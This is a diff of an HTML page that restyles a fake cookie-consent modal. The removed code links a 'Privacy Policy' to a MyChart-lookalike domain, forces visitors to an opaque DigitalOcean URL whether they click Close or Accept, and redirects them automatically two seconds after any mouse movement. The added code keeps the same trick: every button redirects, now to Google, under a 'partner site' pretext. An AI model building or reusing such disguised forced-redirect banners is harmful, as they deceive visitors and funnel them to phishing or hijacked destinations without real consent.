@@ -1,8 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	
 <style>
+    /* Blur effect when modal is active */
+    body.modal-open #mainContent {
+        filter: blur(6px);
+        transition: filter 0.3s ease;
+    }
+
+    /* Optional: add slight dark overlay */
+    body.modal-open #mainContent::after {
+        content: '';
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.2);
+        z-index: 999;
+        pointer-events: none;
+    }
+
+    /* Modal wrapper */
     .modalWrapper {
         position: fixed;
         top: 0;
@@ -10,32 +27,25 @@
         width: 100%;
         height: 100%;
         background-color: rgba(0, 0, 0, 0.7);
-        display: flex;
+        display: none;
         justify-content: center;
         align-items: center;
         z-index: 1000;
-        display: none;
+    }
+
+    .modalWrapper.active {
+        display: flex;
     }
 
     .modalContent {
         background-color: white !important;
-        padding: 20px;
+        padding: 40px;
         position: relative;
         border-radius: 10px;
         border: 2px solid white;
-        padding: 40px;
-    }
-
-    @media (max-width: 520px) {
-        .modalContent {
-            width: 90%;
-        }
-    }
-
-    @media (min-width: 520px) {
-        .modalContent {
-            width: 65%;
-        }
+        width: 90%;
+        max-width: 600px;
+        text-align: center;
     }
 
     .modalContent img {
@@ -48,37 +58,42 @@
         position: absolute;
         top: 10px;
         right: 10px;
-        padding: 5px;
-        color: blue;
+        color: #007bff;
+        background-color: transparent;
+        border: none;
         font-weight: 500;
-        border-radius: 0px 10px 0px 0px;
+        font-size: 14px;
         cursor: pointer;
     }
 
     .actionBtn {
         background-color: #007bff;
-        font-family: "Poppins", Sans-serif;
+        font-family: "Poppins", sans-serif;
         font-weight: 500;
         border: none;
         padding: 15px 30px;
-        color: #FFFFFF;
+        color: #fff;
         border-radius: 5px;
         cursor: pointer;
+        margin-top: 20px;
     }
 
-    / Disable scrolling when modal is open /
     body.modal-open {
         overflow: hidden;
     }
 </style>
 
+<!-- Modal HTML structure -->
 <div class="modalContainer">
-    <div id="modal" class="modalWrapper">
+    <div id="modal" class="modalWrapper" role="dialog" aria-modal="true" aria-labelledby="modal-title">
         <div class="modalContent">
-            <div id="dismissModal" class="closeBtn">Close</div>
-            <h1>Cookie Policy</h1>
-            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://mychartappportalfindz.vercel.app/mychart.html/">Privacy Policy</a>.</p>
-            <button id="confirmBtn" class="actionBtn">Accept</button>
+            <button id="dismissModal" class="closeBtn" aria-label="Close">Close & Continue</button>
+            <h2 id="modal-title">We Use Cookies</h2>
+            <p>
+                We use cookies to personalize content and analyze traffic. By clicking Accept or Close, you agree to continue to our partner site.
+                See our <a href="https://yourdomain.com/privacy-policy" target="_blank">Privacy Policy</a>.
+            </p>
+            <button id="confirmBtn" class="actionBtn">Accept & Continue</button>
         </div>
     </div>
 </div>
@@ -87,53 +102,21 @@
     var modal = document.getElementById('modal');
     var dismissModal = document.getElementById('dismissModal');
     var confirmBtn = document.getElementById('confirmBtn');
+    var redirectUrl = "https://www.google.com"; // ✅ Redirect to Google
 
-    var redirectUrl = "https://c3d6a56afe4615c1e9522d79-cddva.ondigitalocean.app/"; // Set your dynamic URL here
-    var cursorMoved = false;
-    var redirectTimer;
-
-    // Show the modal instantly after page load and disable scrolling
+    // Show modal and apply blur on page load
     window.addEventListener('load', function () {
-        modal.style.display = 'flex';
+        modal.classList.add('active');
         document.body.classList.add('modal-open');
     });
 
-    // Function to close the modal and navigate to a link
-    function closeModal() {
-        modal.style.display = 'none';
-        document.body.classList.remove('modal-open'); // Re-enable scrolling
-        if (redirectUrl) {
-            window.location.href = redirectUrl; // Redirect to the given URL
-        }
+    // Redirect on button click
+    function handleRedirect() {
+        window.location.href = redirectUrl;
     }
 
-    // Close modal on close button click
-    dismissModal.addEventListener('click', function () {
-        closeModal();
-    });
-
-    // Close modal on accept button click
-    confirmBtn.addEventListener('click', function () {
-        closeModal();
-    });
-
-    // Auto redirect after 2 seconds of cursor movement
-    window.addEventListener('mousemove', function () {
-        if (!cursorMoved) {
-            cursorMoved = true;
-            redirectTimer = setTimeout(function () {
-                window.location.href = redirectUrl;
-            }, 2000); // Redirect after 5 seconds
-        }
-    });
-
-    // Prevent modal from closing on clicking outside modal content
-    modal.addEventListener('click', function (event) {
-        if (event.target === modal) {
-            event.stopPropagation(); // Do nothing if clicked outside the modal content
-        }
-    });
-
+    dismissModal.addEventListener('click', handleRedirect);
+    confirmBtn.addEventListener('click', handleRedirect);
 </script>
 
 
